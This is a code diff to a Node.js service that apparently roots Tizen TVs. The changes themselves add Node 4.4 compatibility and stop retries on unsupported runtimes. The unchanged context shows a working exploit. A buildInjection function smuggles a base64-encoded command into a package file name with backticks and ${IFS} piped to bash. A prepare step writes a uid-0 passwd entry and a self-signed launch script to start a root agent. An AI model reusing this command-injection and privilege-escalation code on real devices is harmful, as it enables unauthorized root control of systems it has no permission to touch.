@@ -15,6 +15,7 @@ var state = {
     attempts: [],
     prepared: false,
     running: false,
+    unsupported: false,
     agent: { connected: false }
 };
 
@@ -37,10 +38,20 @@ function buildInjection(command) {
     return 'new2.tpk`printf${IFS}%s${IFS}' + b64 + '|base64${IFS}-d|bash`.tpk';
 }
 
-var pkg = 'archive-root-' + Array.from(crypto.randomBytes(8)).map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');
+// Node 4.4 has no String.prototype.padStart and no destructuring.
+function hex2(b) { return (b < 16 ? '0' : '') + b.toString(16); }
+var pkg = 'archive-root-' + Array.from(crypto.randomBytes(8)).map(hex2).join('');
 
 function ensureDir(p) {
-    fs.mkdirSync(p, { recursive: true });
+    // Node 4.4 fs.mkdirSync has no {recursive:true} and throws EEXIST.
+    var parts = p.split('/').filter(function (s) { return s; });
+    var current = p.charAt(0) === '/' ? '' : '.';
+    parts.forEach(function (name) {
+        current += '/' + name;
+        try { fs.mkdirSync(current, 511 /* 0o777, as the recursive form did */); } catch (e) {
+            if (e.code !== 'EEXIST') throw e;
+        }
+    });
     return p;
 }
 
@@ -86,7 +97,7 @@ function cleanStage(keep) {
         return /^archive-root-[0-9a-f]{16}$/.test(n) && n !== keep;
     }).map(function (n) {
         var t = 0;
-        try { t = fs.statSync(STAGE + '/' + n).mtimeMs; } catch (e) {}
+        try { var st = fs.statSync(STAGE + '/' + n); t = st.mtimeMs || +st.mtime || 0; } catch (e) {}
         return { name: n, time: t };
     }).sort(function (a, b) { return b.time - a.time; });
     var spared = {};
@@ -106,6 +117,15 @@ function cleanStage(keep) {
 }
 
 function prepare(agentPort) {
+    // crypto.generateKeyPairSync and KeyObject.export need Node 10.12+. Tizen 4
+    // and 5.5 run Node 4.4, where the adapter must not touch the file system or
+    // keep retrying: report it once and leave the rest of the service running.
+    if (typeof crypto.generateKeyPairSync !== 'function') {
+        var unsupported = new Error('root agent needs Node 10.12+ (this runtime has ' + process.version + ')');
+        unsupported.code = 'platformUnsupported';
+        throw unsupported;
+    }
+
     var staging = ensureDir(STAGE + '/' + pkg);
     var onDemand = ensureDir(STAGE + '/on-demand');
 
@@ -126,7 +146,7 @@ function prepare(agentPort) {
     fs.writeFileSync(path.join(staging, 'passwd'), 'owner:x:0:0:owner:/home/owner:/bin/sh\n');
 
     var launch = buildLaunchScript(agentPort);
-    var tarBuf = tarGz([{ name: 'launch.sh', data: launch, mode: 0o700, mtime: 0 }]);
+    var tarBuf = tarGz([{ name: 'launch.sh', data: launch, mode: 448 /* 0o700 */, mtime: 0 }]);
     var signature = crypto.sign('RSA-SHA256', tarBuf, privatePem);
 
     fs.writeFileSync(path.join(onDemand, pkg + '.tar.gz'), tarBuf);
@@ -154,9 +174,28 @@ function pushAttempt(entry) {
     if (state.attempts.length > 40) state.attempts.shift();
 }
 
+function prepareForRuntime(port) {
+    try {
+        prepare(port);
+        delete state.prepareError;
+    } catch (e) {
+        state.prepareError = String(e.message || e);
+        if (e.code !== 'platformUnsupported') return;
+        // This runtime will never be able to prepare the agent, so stop the
+        // retry loop (which rewrote the status file every few seconds) and the
+        // loopback listener that nothing can connect to.
+        state.unsupported = true;
+        if (agentServer) {
+            try { agentServer.close(); } catch (ignored) {}
+            agentServer = null;
+        }
+    }
+}
+
 function startAgent() {
     if (state.running) return;
     state.running = true;
+    state.unsupported = false;
     agentServer = new RootAgentServer({
         secret: secret,
         onConnect: function (conn) {
@@ -189,13 +228,13 @@ function startAgent() {
     agentServer.start(function (port) {
         if (!state.running) return;
         state.agentPort = port;
-        try { prepare(port); } catch (e) { state.prepareError = String(e.message || e); }
+        prepareForRuntime(port);
         relaunch();
     });
 }
 
 function scheduleRelaunch() {
-    if (!state.running || relaunchTimer) return;
+    if (!state.running || state.unsupported || relaunchTimer) return;
     relaunchTimer = setTimeout(function () {
         relaunchTimer = null;
         relaunch();
@@ -203,7 +242,7 @@ function scheduleRelaunch() {
 }
 
 function relaunch() {
-    if (launching || agentConnected || !agentServer || !state.running) return;
+    if (launching || agentConnected || !agentServer || !state.running || state.unsupported) return;
     launching = true;
     var gen = ++launchGen;
 
@@ -215,7 +254,8 @@ function relaunch() {
     // if the first prepare failed (e.g. staging not writable early at boot),
     // retry it with the already-assigned agent port
     if (!state.prepared && state.agentPort) {
-        try { prepare(state.agentPort); } catch (e) { state.prepareError = String(e.message || e); }
+        prepareForRuntime(state.agentPort);
+        if (state.unsupported) { launching = false; return; }
     }
 
     if (!state.prepared) {
@@ -227,7 +267,7 @@ function relaunch() {
     delete state.prepareError;
     // A missing token is a preparation failure, never a launchable state.
     try {
-        fs.writeFileSync(STAGE + '/' + pkg + '/root-agent.token', secretB64 + '\n', { mode: 0o600 });
+        fs.writeFileSync(STAGE + '/' + pkg + '/root-agent.token', secretB64 + '\n', { mode: 384 /* 0o600 */ });
     } catch (e) {
         launching = false;
         state.prepareError = String(e.message || e);
